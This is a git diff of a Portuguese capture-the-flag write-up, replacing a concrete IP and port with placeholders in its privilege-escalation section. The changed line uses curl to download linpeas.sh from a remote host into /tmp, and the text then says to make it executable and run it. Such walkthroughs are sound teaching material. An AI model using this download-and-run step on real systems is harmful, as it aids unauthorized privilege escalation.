@@ -65,7 +65,7 @@ Temos _user.txt_, mas sem permissões para ler seu conteúdo
 ## _**Escalando privilégios**_
 Primeiro, vamos buscar ```linpeas.sh``` via ```curl```
 > ```bash
-> curl http://10.9.3.253:9000/linpeas.sh -o /tmp/linpeas.sh
+> curl http://[ip_address]:[port]/linpeas.sh -o /tmp/linpeas.sh
 > ```
 Em seguida, damos as permissões e executamos  
 Após, vamos procurar uma maneira de conseguir escalar privilégios  
